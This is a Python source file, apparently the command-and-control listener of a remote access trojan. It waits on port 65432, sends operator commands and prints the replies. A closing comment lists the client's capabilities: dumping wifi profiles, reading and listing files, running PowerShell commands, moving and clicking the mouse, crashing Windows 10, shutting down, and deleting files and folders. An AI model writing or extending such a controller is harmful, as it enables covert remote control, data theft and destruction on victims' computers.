import socket
import io
import sys
HOST = '0.0.0.0'
PORT = 65432

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    print("Waiting for connections...")
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected! {addr} \n")
        
        while True:
            msg = input(f"YOU : ")
            while msg == "":
                msg = input(f"YOU : ")
                if msg == "q":
                    data = conn.recv(1024)
                    data =data.decode('utf-8')
                    print(data)
            try:
                conn.send(msg.encode())
            except ConnectionResetError:
                print("off")  
            try:
                data = conn.recv(1024)
                data =data.decode('utf-8')
                print(data)
            except ConnectionResetError:
                print("Client is currently offline!")
                quit()
            if not data:
                break
'''
Commmands :
1.all wifi
2.get_user
3.name
4.cwd
5.files
6.OS
7.dimen
8.openweb <url>
9.readfile <name>
10.move     <x,y>
11.click <1 or 2>
12.public ip
13.ipv4
14.pwr <cmd>
15.shutdown
16.crash (works only on win10)
17.del <file_path>
18. del_fldr <path>
'''
